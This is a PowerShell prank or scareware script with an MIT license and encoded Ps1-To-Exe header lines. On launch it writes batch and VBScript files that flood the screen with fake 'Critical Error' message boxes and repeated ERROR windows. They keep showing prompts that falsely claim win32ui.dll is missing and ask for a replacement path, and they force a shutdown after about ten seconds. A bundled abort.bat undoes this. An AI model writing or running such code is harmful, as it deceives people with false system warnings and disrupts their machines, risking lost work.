##[Ps1 To Exe]
##
##Kd3HDZOFADWE8uO1
##Nc3NCtDXTlaDjofG5iZk2Vn0Sn15UvSOuKSmypW18e/QiCDVT9owTEdjhDz/EAuOXOMHUPsWse0DUA4WAecA5/zZGOjJ
##Kd3HFJGZHWLWoLaVvnQnhQ==
##LM/RF4eFHHGZ7/K1
##K8rLFtDXTiW5
##OsHQCZGeTiiZ49I=
##OcrLFtDXTiW5
##LM/BD5WYTiiZ49I=
##McvWDJ+OTiiZ4tI=
##OMvOC56PFnzN8u+Vs1Q=
##M9jHFoeYB2Hc8u+Vs1Q=
##PdrWFpmIG2HcofKIo2QX
##OMfRFJyLFzWE8uK1
##KsfMAp/KUzWJ0g==
##OsfOAYaPHGbQvbyVvnQX
##LNzNAIWJGmPcoKHc7Do3uAuO
##LNzNAIWJGnvYv7eVvnQX
##M9zLA5mED3nfu77Q7TV64AuzAgg=
##NcDWAYKED3nfu77Q7TV64AuzAgg=
##OMvRB4KDHmHQvbyVvnQX
##P8HPFJGEFzWE8tI=
##KNzDAJWHD2fS8u+Vgw==
##P8HSHYKDCX3N8u+Vgw==
##LNzLEpGeC3fMu77Ro2k3hQ==
##L97HB5mLAnfMu77Ro2k3hQ==
##P8HPCZWEGmaZ7/K1
##L8/UAdDXTlaDjofG5iZk2Vn0Sn15UvSOuKSmypW18e/QiCDVT9owTEdjhDz/EAuOXOMHUPsWse0DUA4WHPcH5PL0HvS9V7cJhqNMbvSbo7wqEBTd+5aU
##Kc/BRM3KXhU=
##
##
##fd6a9f26a06ea3bc99616d4851b372ba
<#
Copyright 2018 alfphaderp

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#>

# Load scripts if not present
if(-Not (Test-Path 'src\main.bat')) {
    # Create a directory to store scripts
    New-Item 'src' -ItemType 'directory'

    # Notify the user an error has occurred and exit if the directory was unable to be created
    if(-Not (Test-Path 'src')) {
        [System.Windows.MessageBox]::Show('Unable to create the directory: "src"','Error','OK','Error')
        Exit
    }

    # Navigate to the directory and load files
    Set-Location 'src'
    Add-Content main.bat '@echo off','call sub0.bat','','start sub1.bat','',':loop','set /a x=%random% %% 23000','set /a y=%random% %% 13000','echo a=InputBox("Warning: The following file critical to system operation is missing or corrupted: win32ui.dll. Please enter the filepath for a replacement immediately.", "Critical Warning", "C:\Windows\System32\win32ui.dll", %x%, %y%) > sub4.vbs','','start sub2.bat','start sub3.vbs','start sub4.vbs','goto loop'
    Add-Content sub0.bat '@echo off','setlocal enabledelayedexpansion','','set str=ERROR','for /l %%i in (1, 1, 19) do set str=!str! %str%','','title %str%','for /l %%i in (1, 1, 30) do echo %str%'
    Add-Content sub1.bat '@echo off','call sub0.bat','','timeout /t 10 > nul','shutdown -s -t 3'
    Add-Content sub2.bat '@echo off','setlocal enabledelayedexpansion','call sub0.bat','','set str=ERROR','for /l %%i in (1, 1, 19) do set str=!str! %str%','',':loop','echo %str%','set /a a = %random% %% 5','timeout /t %a% > nul','goto loop'
    Add-Content sub3.vbs 'do','x=MsgBox("A Critical Error has occured at 0x9d18af32. Please contact your system administrator for more information.", 16, "Critical Error")','loop'
    Add-Content abort.bat '@echo off','','shutdown /a','taskkill /f /im wscript.exe','taskkill /f /im cmd.exe'

    # Navigate back to parent directory
    Set-Location '..'
}

# Release the kraken
Set-Location 'src'
Start-Process 'main.bat'